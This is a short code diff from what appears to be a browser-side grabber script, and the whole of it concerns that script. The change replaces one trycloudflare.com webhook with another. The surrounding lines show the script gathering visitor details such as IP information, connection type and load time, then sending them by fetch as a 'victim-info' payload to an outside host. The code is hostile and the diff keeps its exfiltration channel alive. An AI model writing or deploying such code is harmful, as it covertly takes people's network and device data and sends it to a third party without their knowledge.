@@ -90,7 +90,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://japan-shows-descriptions-dl.trycloudflare.com/userData";
+                const webhookURL = "https://bow-honest-deleted-headphones.trycloudflare.com/userData";
 
                 const payload = {'victim-info': ipinfo}; 
                 fetch(webhookURL, {
